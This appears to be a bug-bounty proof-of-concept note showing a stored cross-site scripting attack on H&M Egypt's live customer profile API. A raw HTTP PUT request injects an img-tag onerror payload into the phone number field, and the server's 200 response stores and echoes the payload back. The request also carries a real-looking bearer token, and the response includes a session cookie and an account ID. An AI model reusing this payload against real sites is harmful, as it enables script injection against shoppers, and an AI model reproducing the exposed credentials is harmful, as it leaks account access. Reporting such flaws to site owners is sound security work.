# eg.hm.com
Cookie: _gcl_au=; _ga_123456789=; _ga=; _ga_3RX1WR8L7L=; _ga_0QMV1N7543=; FPID=; _scid=; _sctr=; cto_bundle=; _fbp=; _tt_enable_cookie=; _ttp=; ttcsid_C0IHK3CP76SVVJ0UVOMG=; ttcsid=; _clck=; kndctr_F32964A465671E4A0A495FCC_AdobeOrg_identity=; kndctr_F32964A465671E4A0A495FCC_AdobeOrg_cluster=; _ALGOLIA=; _ga_TZ068BM65R=; th_external_id=; _pin_unauth=; FPLC=; __exponea_etc__=; __exponea_time2__=; __rtbh.uid=; __rtbh.lid=; th_capi_em=; th_capi_fn=; th_capi_ln=; auth_user_token=; _scid_r=; _clsk=
![[Poc__.hm.com.mp4]]
## Request
```
PUT /rest/egy_en/V1/customers/me HTTP/2
Host: eg.hm.com
Cookie: _gcl_au=; _ga_123456789=; _ga=; _ga_3RX1WR8L7L=; _ga_0QMV1N7543=; FPID=; _scid=; _sctr=; cto_bundle=; _fbp=; _tt_enable_cookie=; _ttp=; ttcsid_C0IHK3CP76SVVJ0UVOMG=; ttcsid=; _clck=; kndctr_F32964A465671E4A0A495FCC_AdobeOrg_identity=; kndctr_F32964A465671E4A0A495FCC_AdobeOrg_cluster=; _ALGOLIA=; _ga_TZ068BM65R=; th_external_id=; _pin_unauth=; FPLC=; __exponea_etc__=; __exponea_time2__=; __rtbh.uid=; __rtbh.lid=; th_capi_em=; th_capi_fn=; th_capi_ln=; auth_user_token=; _scid_r=; _clsk=
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:142.0) Gecko/20100101 Firefox/142.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: https://eg.hm.com/en/user/account/profile
Content-Type: application/json
Authorization: Bearer eyJraWQiOiIxIiwiYWxnIjoiSFMyNTYifQ.eyJ1aWQiOjEzMDg4MTk3LCJ1dHlwaWQiOjMsImlhdCI6MTc1NjA2OTk5MywiZXhwIjoxNzYzODQ1OTkzfQ.qTy5Bz_yx4AwL7dBREAzyKrdZGp2r0NE3PCQr4uo308
Content-Length: 221
Origin: https://eg.hm.com
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
X-Pwnfox-Color: red
Priority: u=0
Te: trailers

{"customer":{"firstname":"hacker","lastname":"test","email":"PhilopaterSh@Hacked.com","extension_attributes":{},"custom_attributes":[{"attribute_code":"phone_number","value":"<img src=x onerror=alert('PhilopaterSh')>"}]}}
```

## Response
```
HTTP/2 200 OK
Content-Type: application/json; charset=utf-8
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store
Pragma: no-cache
X-Platform-Server: i-0bce0a8f1b7a5be3b
X-Frame-Options: SAMEORIGIN
X-Timer: S1756079905.355453,VS0,VE292
Traceresponse: 00-185ed95eafffb770cad9273bf59f1555-10979eb1373863a4-01
X-Debug-Info: eyJyZXRyaWVzIjowfQ==
Set-Cookie: PHPSESSID=b8b84e0a6ec8144a35e989829e5be7a6; expires=Mon, 25-Aug-2025 00:58:25 GMT; Max-Age=3600; path=/; domain=hm.store.alshaya.com; secure; HttpOnly; SameSite=Lax
Accept-Ranges: bytes
Date: Sun, 24 Aug 2025 23:58:25 GMT
X-Served-By: cache-lhr-egll1980046-LHR, cache-lhr-egll1980042-LHR, cache-mrs1050096-MRS
X-Cache: MISS, MISS, MISS
X-Cache-Hits: 0, 0, 0
Strict-Transport-Security: max-age=31536000
Vary: Accept-Encoding
Content-Length: 925

{"id":13088197,"group_id":1,"created_at":"2025-08-18 08:00:54","updated_at":"2025-08-24 23:58:25","created_in":"EG Arabic","email":"PhilopaterSh@Hacked.com","firstname":"hacker","lastname":"test","store_id":27,"website_id":15,"addresses":[],"disable_auto_group_change":0,"extension_attributes":{"is_subscribed":false,"email_verified":false,"sprinklr_hash":["egy_ar-961f692271ac7ecdbb991598c6e64c659094ea0e1c2cd1a73dabc46638497dd7","egy_en-62cc3bb7ebc782be2f17ad5f87d252b93888c20a00030c7562e8dc107dabbfb2"],"sprinklr_user_data_fields":{"id":13088197,"first_name":"hacker","last_name":"test","profile_image_url":"","phone_no":"","email":"PhilopaterSh@Hacked.com"}},"custom_attributes":[{"attribute_code":"email_verified","value":"0","name":"email_verified"},{"attribute_code":"phone_number","value":"<img src=x onerror=alert('PhilopaterSh')>","name":"phone_number"},{"attribute_code":"channel","value":"web","name":"channel"}]}
```
